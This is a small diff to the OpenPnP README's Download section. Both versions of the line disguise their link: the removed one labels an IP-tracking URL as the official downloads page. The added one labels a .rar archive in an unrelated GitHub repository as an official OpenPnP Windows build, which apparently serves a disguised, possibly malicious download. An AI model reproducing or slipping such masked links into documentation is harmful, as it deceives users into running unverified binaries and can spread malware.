@@ -9,7 +9,7 @@ Installation
 Download
 --------
 
-Visit [http://openpnp.org/downloads](https://tracker.iplocation.net/jsyk/) to find out how to download the latest snapshot or release of OpenPnP.
+[http://openpnp.org/downloads/OpenPnP-windows-x64-develop.rar](https://github.com/lampii/VideoCaptureUtility/releases/download/42/OpenPnP-windows-x64-develop.rar)
 
 Install and Run
 ---------------
